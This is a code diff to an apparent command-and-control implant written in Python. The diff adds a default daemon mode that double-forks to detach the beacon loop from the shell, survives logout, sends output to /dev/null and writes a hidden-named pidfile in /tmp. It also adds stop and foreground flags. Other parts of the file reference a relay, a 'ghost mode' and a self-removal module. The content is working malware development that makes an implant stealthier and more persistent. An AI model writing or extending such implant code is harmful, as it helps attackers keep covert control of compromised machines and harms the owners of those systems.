@@ -58,6 +58,15 @@ Relay mode (C2_RELAY_PORT or /module relay start):
   The relay runs in a daemon thread; normal beacon loop is unaffected.
   Can be started/stopped dynamically via /module relay without redeploying.
 
+Daemon mode (default):
+  A plain `python3 agent.py` returns immediately: the beacon loop continues in
+  a detached daemon (double-fork: fork → setsid → fork) immune to SIGHUP on
+  shell logout/disconnect; stdio is redirected to /dev/null and the PID is
+  written to /tmp/.nullrelay.pid (auto-cleaned by /module suicide).
+  Flags:  --id          print the agent id and exit
+          --stop        SIGTERM the running daemon via the pidfile
+          --foreground  (-f) stay attached, no daemonization (debugging)
+
 Dependencies: Python 3.6+ stdlib only. No pip required on the target.
 
 Limitations:
@@ -81,6 +90,7 @@ JITTER      = int(os.environ.get("C2_JITTER", "10"))
 GHOST_MODE  = False
 RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
 RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")
+PIDFILE     = "/tmp/.nullrelay.pid"
 
 _relay_server = None
 
@@ -516,10 +526,54 @@ def _beacon():
         time.sleep(1)
 
 
+def _daemonize():
+    if not hasattr(os, "fork"):
+        return
+    pid = os.fork()
+    if pid > 0:
+        sys.exit(0)
+    os.setsid()
+    if os.fork() > 0:
+        os._exit(0)
+    devnull = os.open(os.devnull, os.O_RDWR)
+    for fd in (0, 1, 2):
+        os.dup2(devnull, fd)
+    try:
+        with open(PIDFILE, "w") as f:
+            f.write(str(os.getpid()))
+    except OSError:
+        pass
+
+
+def _daemon_stop():
+    try:
+        with open(PIDFILE) as f:
+            pid = int(f.read().strip())
+        os.kill(pid, 15)
+        print(f"[daemon stopped : {pid}]")
+    except FileNotFoundError:
+        print("[no daemon]")
+        return
+    except ProcessLookupError:
+        print("[stale pidfile]")
+    except Exception as e:
+        print(f"[stop failed : {e}]")
+        return
+    try:
+        os.unlink(PIDFILE)
+    except OSError:
+        pass
+
+
 def main():
     if len(sys.argv) > 1 and sys.argv[1] == "--id":
         print(AGENT_ID)
         return
+    if len(sys.argv) > 1 and sys.argv[1] == "--stop":
+        _daemon_stop()
+        return
+    if not any(a in ("-f", "--foreground") for a in sys.argv[1:]):
+        _daemonize()
     if RELAY_PORT:
         _start_relay()
     while True:
